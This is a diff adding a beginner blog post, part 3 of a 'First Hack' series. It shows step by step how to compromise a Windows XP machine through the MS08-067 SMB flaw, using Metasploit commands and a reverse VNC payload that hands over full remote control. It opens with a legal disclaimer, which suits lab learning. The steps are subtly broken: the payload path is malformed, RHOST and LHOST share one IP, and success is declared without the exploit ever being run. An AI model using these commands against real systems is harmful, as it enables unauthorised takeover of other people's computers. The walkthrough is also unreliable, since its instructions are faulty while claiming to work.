@@ -1,0 +1,91 @@
+---
+layout: post
+title:  "First Hack Part 3 (Exploiting The Vulnurability)"
+date:   2018-03-28 14:56:03 -0400
+categories: jekyll update
+---
+
+Legal Disclosure: Don't do this on networks other than your own without written consent from the network administrator. Otherwise you would be commiting an illegal act.
+
+Now that we have sucessfully obtained a list of all the vulnurabilities, we are going to use one of the bigger ones. You could use more than one of the critical vulnurabilities in Nessus but we are going to use MS08_067
+
+<b>Finding The Commands To Hack Windows XP</b>
+
+Once we have the codes, we need to look them up in the "Rapid 7" database. Rapid 7 is a company that develops a cool called Metasploit, which is the tool we use to actually hack another computer. We are going to use a tool called a VNC (Virtual Network Computing). This is a window that contains the remote operating system. It allows mouse and keyboard controlls, much like the virtual machine you are using now.
+
+First, go to the [Rapid7 Vulnurabilities & Exploit Database][Rapid7-DB]
+
+Type in the vulnurability code we want to use. In our particular case, it is MS08_067
+
+In the dropdown menue to the right of the search field, choose "Metasploit Moduels"
+
+Look under "Moduel Name" and identify the code exploit/windows/smb/ms08_067_netapi. We will use this later
+
+Open terminal and type in the following command
+
+
+
+{% highlight ruby %}
+msfconsole
+{% endhighlight %}
+
+Wait for it to load then type in the following
+
+{% highlight ruby %}
+use exploit/windows/smb/ms08_067_netapi
+{% endhighlight %}
+
+Next we will need to use a payload. A payload is basicly software that takes advantage of the exploit. So type
+
+{% highlight ruby %}
+set PAYLOAD /windows/vncinject/reverse_tcp
+{% endhighlight %}
+
+You will need to load a list of settings before running the command to hack the Windows XP computer. We can do this by typing
+
+{% highlight ruby %}
+show options
+{% endhighlight %}
+
+You should get something like the image below
+
+IMAGE OF SHOW OPTIONS
+
+You may notice that a fiew of the fields are empty. RHOST and LHOST. RHOST is the remote host. The IP of the target computer. LHOST is the local host. Your computer.
+
+You may not know your own IP. So open a new terminal tab with Ctrl+Shift+T and type
+
+{% highlight ruby %}
+ifconfig
+{% endhighlight %}
+
+You should see something like this. I highlighted the IP in yellow.
+
+IMMAGE OF IFCONFIG
+
+Type in the following, but replace the RHOST IP with the Windows IP you found earlier and LHOST of the Kali IP.
+
+{% highlight ruby %}
+set RHOST 192.168.1.244
+{% endhighlight %}
+
+{% highlight ruby %}
+set LHOST 192.168.1.244
+{% endhighlight %}
+
+We have everything we need right? Just one more setting. This will allow us to controll the computer rather than simply spy on it.
+
+{% highlight ruby %}
+set ViewOnly false
+{% endhighlight %}
+
+Now run show options again and you should have something like this.
+
+IMAGE OF SHOW OPTIONS
+
+Congradulations. You did it! You can now do whatever you like to the target computer.
+
+
+[Rapid7-DB]: https://www.rapid7.com/db
+
+
